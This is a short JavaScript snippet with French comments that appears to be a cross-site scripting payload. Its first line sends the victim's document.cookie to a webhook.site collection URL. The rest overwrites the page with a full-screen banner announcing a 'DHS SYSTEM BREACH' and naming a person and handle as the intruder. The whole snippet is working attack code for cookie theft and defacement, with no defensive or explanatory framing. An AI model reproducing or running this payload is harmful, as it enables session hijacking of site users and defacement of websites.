// 1. Envoie les cookies vers Webhook.site
fetch("https://webhook.site/b1d640da-80fe-4cfb-9302-de9da74519ad?cookie=" + document.cookie);

// 2. Affiche un message rouge au milieu de l'écran
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;
              background:black;color:white;font-size:2em;
              display:flex;align-items:center;justify-content:center;z-index:9999;">
    🚨 DHS SYSTEM BREACH BY Patrick de Noronha aka Pa13cK 🚨
  </div>
`;
